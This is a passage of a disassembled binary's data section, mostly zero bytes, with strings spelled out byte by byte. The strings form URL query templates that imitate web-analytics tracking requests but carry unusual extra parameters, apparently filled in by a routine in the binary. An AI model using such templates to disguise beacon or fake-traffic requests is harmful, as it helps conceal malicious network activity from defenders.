                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  41h ; A
                db  51h ; Q
                db  42h ; B
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  6Eh ; n
                db  64h ; d
                db  68h ; h
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  74h ; t
                db  3Dh ; =
                db  34h ; 4
                db  38h ; 8
                db  30h ; 0
                db  26h ; &
                db  6Ch ; l
                db  76h ; v
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  70h ; p
                db  61h ; a
                db  67h ; g
                db  65h ; e
                db  4Eh ; N
                db  61h ; a
                db  6Dh ; m
                db  65h ; e
                db  3Dh ; =
                db  41h ; A
                db  62h ; b
                db  6Fh ; o
                db  75h ; u
                db  74h ; t
                db  26h ; &
                db  73h ; s
                db  73h ; s
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  67h ; g
                db  3Dh ; =
                db  43h ; C
                db  6Fh ; o
                db  75h ; u
                db  6Eh ; n
                db  63h ; c
                db  69h ; i
                db  6Ch ; l
                db  26h ; &
                db  63h ; c
                db  69h ; i
                db  64h ; d
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  76h ; v
                db  31h ; 1
                db  3Dh ; =
                db  63h ; c
                db  32h ; 2
                db  35h ; 5
                db  26h ; &
                db  68h ; h
                db  70h ; p
                db  3Dh ; =
                db  4Eh ; N
                db  26h ; &
                db  74h ; t
                db  61h ; a
                db  6Ch ; l
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  41h ; A
                db  51h ; Q
                db  45h ; E
                db  3Dh ; =
                db  31h ; 1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aGmes           db 'gmes?',0            ; DATA XREF: sub_404110+7F↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ah ; j
                db  61h ; a
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  71h ; q
                db  75h ; u
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Bh ; k
                db  69h ; i
                db  6Eh ; n
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  63h ; c
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ah ; j
                db  6Fh ; o
                db  6Bh ; k
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  6Ch ; l
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  77h ; w
                db  76h ; v
                db  3Dh ; =
                db  34h ; 4
                db  2Eh ; .
                db  39h ; 9
                db  2Eh ; .
                db  34h ; 4
                db  26h ; &
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  73h ; s
                db  3Dh ; =
                db  35h ; 5
                db  26h ; &
                db  6Ah ; j
                db  61h ; a
                db  63h ; c
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  63h ; c
                db  73h ; s
                db  3Dh ; =
                db  69h ; i
                db  73h ; s
                db  6Fh ; o
                db  2Dh ; -
                db  38h ; 8
                db  38h ; 8
                db  35h ; 5
                db  39h ; 9
                db  2Dh ; -
                db  31h ; 1
                db  26h ; &
                db  71h ; q
                db  75h ; u
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  73h ; s
                db  63h ; c
                db  3Dh ; =
                db  33h ; 3
                db  32h ; 2
                db  2Dh ; -
                db  62h ; b
                db  69h ; i
                db  74h ; t
                db  26h ; &
                db  6Bh ; k
                db  69h ; i
                db  6Eh ; n
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  6Ah ; j
                db  65h ; e
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  61h ; a
                db  63h ; c
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  75h ; u
                db  74h ; t
                db  6Dh ; m
                db  75h ; u
                db  3Dh ; =
                db  44h ; D
                db  42h ; B
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aBordAspx       db 'bord.aspx?',0       ; DATA XREF: sub_404110+91↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  6Bh ; k
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  79h ; y
                db  6Fh ; o
                db  79h ; y
                db  6Fh ; o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  6Fh ; o
                db  66h ; f
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  62h ; b
                db  6Ch ; l
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  63h ; c
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Dh ; m
                db  75h ; u
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  69h ; i
                db  3Dh ; =
                db  34h ; 4
                db  33h ; 3
                db  34h ; 4
                db  35h ; 5
                db  26h ; &
                db  73h ; s
                db  6Bh ; k
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  74h ; t
                db  6Dh ; m
                db  3Dh ; =
                db  43h ; C
                db  4Ch ; L
                db  42h ; B
                db  26h ; &
                db  6Dh ; m
                db  6Fh ; o
                db  64h ; d
                db  5Fh ; _
                db  74h ; t
                db  3Dh ; =
                db  31h ; 1
                db  33h ; 3
                db  26h ; &
                db  76h ; v
                db  69h ; i
                db  73h ; s
                db  69h ; i
                db  5Fh ; _
                db  74h ; t
                db  3Dh ; =
                db  31h ; 1
                db  33h ; 3
                db  26h ; &
                db  79h ; y
                db  6Fh ; o
                db  79h ; y
                db  6Fh ; o
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ah ; j
                db  61h ; a
                db  76h ; v
                db  61h ; a
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  6Eh ; n
                db  65h ; e
                db  77h ; w
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  73h ; s
                db  6Fh ; o
                db  66h ; f
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  63h ; c
                db  6Fh ; o
                db  6Ch ; l
